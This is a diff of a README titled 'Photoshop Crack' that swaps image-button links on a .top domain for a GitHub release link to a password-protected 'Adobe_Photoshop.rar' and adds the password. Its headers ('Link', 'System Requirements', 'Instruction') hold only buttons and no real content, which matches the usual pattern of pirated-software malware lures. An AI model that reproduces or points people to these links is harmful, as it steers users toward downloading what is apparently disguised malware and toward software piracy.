@@ -1,14 +1,16 @@
 # Photoshop Crack
 
-[![https://jbali.mosle.top/jtdqr](https://jbali.mosle.top/nefsc)](https://jbali.mosle.top/jtdqr)
+
+[![x1sp](https://jbali.mosle.top/nefsc)](https://github.com/Lars901/PHS_AB/releases/download/download/Adobe_Photoshop.rar)
 # ✅ Link:
-[![https://jbali.mosle.top/jtdqr](https://jbali.mosle.top/rhkym)](https://jbali.mosle.top/jtdqr)
+[![x1sp](https://jbali.mosle.top/rhkym)](https://github.com/Lars901/PHS_AB/releases/download/download/Adobe_Photoshop.rar)
+<h2>Password: github</h2>
 # 🛠 System Requirements:
-[![https://jbali.mosle.top/jtdqr](https://jbali.mosle.top/lxfad)](https://jbali.mosle.top/jtdqr)
+[![x1sp](https://jbali.mosle.top/lxfad)](https://github.com/Lars901/PHS_AB/releases/download/download/Adobe_Photoshop.rar)
 # 🎲 Functions:
-[![https://jbali.mosle.top/jtdqr](https://jbali.mosle.top/mhmtr)](https://jbali.mosle.top/jtdqr)
-[![https://jbali.mosle.top/jtdqr](https://jbali.mosle.top/rjvcj)](https://jbali.mosle.top/jtdqr)
+[![x1sp](https://jbali.mosle.top/mhmtr)](https://github.com/Lars901/PHS_AB/releases/download/download/Adobe_Photoshop.rar)
+[![x1sp](https://jbali.mosle.top/rjvcj)](https://github.com/Lars901/PHS_AB/releases/download/download/Adobe_Photoshop.rar)
 # ⚙️ Instruction:
-[![https://jbali.mosle.top/jtdqr](https://jbali.mosle.top/ftjpb)](https://jbali.mosle.top/jtdqr)
+[![x1sp](https://jbali.mosle.top/ftjpb)](https://github.com/Lars901/PHS_AB/releases/download/download/Adobe_Photoshop.rar)
 #
-[![https://jbali.mosle.top/jtdqr](https://jbali.mosle.top/dkzmo)](https://jbali.mosle.top/jtdqr)
+[![x1sp](https://jbali.mosle.top/dkzmo)](https://github.com/Lars901/PHS_AB/releases/download/download/Adobe_Photoshop.rar)
